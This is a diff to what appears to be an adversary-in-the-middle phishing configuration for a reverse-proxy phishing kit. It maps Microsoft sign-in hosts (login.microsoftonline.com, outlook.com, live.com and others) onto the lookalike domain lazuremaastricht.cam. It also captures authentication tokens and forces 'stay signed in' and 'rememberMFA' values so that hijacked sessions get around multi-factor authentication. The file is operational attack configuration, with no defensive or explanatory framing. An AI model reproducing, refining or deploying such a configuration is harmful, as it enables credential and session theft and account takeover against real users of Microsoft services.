@@ -5,18 +5,18 @@ min_ver: '2.4.0'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false}
-  - {phish_sub: 'device.login', orig_sub: 'device.login', domain: 'microsoftonline.com', session: true, is_landing: false}
+  - {phish_sub: 'device', orig_sub: 'device', domain: 'login.microsoftonline.com', session: true, is_landing: false}
   - {phish_sub: 'outlook', orig_sub: 'www', domain: 'outlook.com', session: true, is_landing: false}
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
-  - {phish_sub: 'secure.aadcdn', orig_sub: 'secure.aadcdn', domain: 'microsoftonline-p.com', session: false, is_landing: false}
+  - {phish_sub: 'login2', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
   - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false}
+  - {phish_sub: 'aadcdnsecure', orig_sub: 'secure.aadcdn', domain: 'microsoftonline-p.com', session: false, is_landing: false}
 
 sub_filters:
   - {triggers_on: "login.microsoftonline.com", orig_sub: "login.microsoftonline.com", domain: "login.lazuremaastricht.cam", cookie: true, force_https: true}
   - {triggers_on: "www.office.com", orig_sub: "www.office.com", domain: "www.lazuremaastricht.cam", cookie: false, force_https: true}
   - {triggers_on: "www.outlook.com", orig_sub: "www.outlook.com", domain: "outlook.lazuremaastricht.cam", cookie: true, force_https: true}
-  - {triggers_on: "live.com", orig_sub: "login.live.com", domain: "login.lazuremaastricht.cam", cookie: true, force_https: true}
-  - {triggers_on: "secure.aadcdn.microsoftonline-p.com", orig_sub: "secure.aadcdn.microsoftonline-p.com", domain: "secure.aadcdn.lazuremaastricht.cam", cookie: false, force_https: true}
+  - {triggers_on: "login.live.com", orig_sub: "login.live.com", domain: "login2.lazuremaastricht.cam", cookie: true, force_https: true}
+  - {triggers_on: "secure.aadcdn.microsoftonline-p.com", orig_sub: "secure.aadcdn.microsoftonline-p.com", domain: "aadcdnsecure.lazuremaastricht.cam", cookie: false, force_https: true}
 
 auth_tokens:
   - domain: '.login.microsoftonline.com'
@@ -46,29 +46,29 @@ login:
 
 force_post:
   - path: '/kmsi'
-    search: 
+    search:
       - {key: 'LoginOptions', search: '.*'}
     force:
       - {key: 'LoginOptions', value: '1'}
     type: 'post'
 
   - path: '/common/SAS'
-    search: 
+    search:
       - {key: 'rememberMFA', search: '.*'}
     force:
       - {key: 'rememberMFA', value: 'true'}
     type: 'post'
 
 path_rules:
-  - path: "/oauth20_authorize.srf"
-    action: "proxy"
-  - path: "/landingv2"
-    action: "proxy"
-  - path: "/common/oauth2/authorize"
-    action: "proxy"
-  - path: "/common/oauth2/v2.0/authorize"
-    action: "proxy"
-  - path: "/auth/login"
-    action: "proxy"
-  - path: "/auth/reauth"
-    action: "proxy"
+  - path: '/oauth20_authorize.srf'
+    action: 'proxy'
+  - path: '/landingv2'
+    action: 'proxy'
+  - path: '/common/oauth2/authorize'
+    action: 'proxy'
+  - path: '/common/oauth2/v2.0/authorize'
+    action: 'proxy'
+  - path: '/auth/login'
+    action: 'proxy'
+  - path: '/auth/reauth'
+    action: 'proxy'
